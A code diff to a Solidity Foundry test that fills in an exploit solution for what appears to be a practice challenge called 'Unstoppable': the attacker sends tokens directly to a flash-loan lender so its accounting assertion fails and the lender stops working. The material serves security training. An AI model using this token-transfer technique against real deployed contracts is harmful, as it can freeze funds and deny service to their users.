@@ -56,7 +56,16 @@ contract Unstoppable is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        dvt.approve(address(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);
+        dvt.transferFrom(
+            address(attacker),
+            address(unstoppableLender),
+            INITIAL_ATTACKER_TOKEN_BALANCE
+        );
+        vm.stopPrank();
         /** EXPLOIT END **/
+
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
     }
